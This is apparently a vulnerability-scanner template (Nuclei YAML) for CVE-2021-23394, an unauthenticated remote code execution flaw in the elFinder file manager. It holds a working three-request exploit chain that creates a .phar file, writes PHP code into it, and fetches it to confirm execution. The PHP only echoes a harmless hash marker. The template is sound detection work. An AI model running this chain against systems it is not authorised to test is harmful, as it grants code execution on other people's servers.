id: CVE-2021-23394

info:
  name: elFinder < 2.1.58 - Remote Code Execution
  author: 0xanis
  severity: critical
  description: |
    elFinder versions prior to 2.1.58 are vulnerable to a command injection vulnerability.
    A specially crafted command to the elFinder file manager PHP connector allows an
    unauthenticated attacker to create a malicious PHAR file and achieve remote code execution.
  reference:
    - https://github.com/Studio-42/elFinder/issues/3295
    - https://blog.sonarsource.com/elfinder-the-story-of-a-file-manager-and-a-bunch-of-vulnerabilities
    - https://nvd.nist.gov/vuln/detail/CVE-2021-23394
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-23394
    cwe-id: CWE-434
  tags: cve,cve2021,elfinder,rce,phar,unauthenticated,fileupload

variables:
  filename: "{{randstr}}"
  payload_str: "{{randstr}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/elFinder/php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name={{filename}}.phar"
    headers:
      Accept: "application/json"
    extractors:
      - type: json
        name: hash
        part: body
        json:
          - ".added[0].hash"
        internal: true

  - method: GET
    path:
      - "{{BaseURL}}/elFinder/php/connector.minimal.php?cmd=put&target={{hash}}&content=<?=''; echo md5('{{payload_str}}'); ?>"
    headers:
      Accept: "application/json"

  - method: GET
    path:
      - "{{BaseURL}}/elFinder/files/{{filename}}.phar"

    matchers:
      - type: word
        part: body
        words:
          - "{{md5(payload_str)}}"
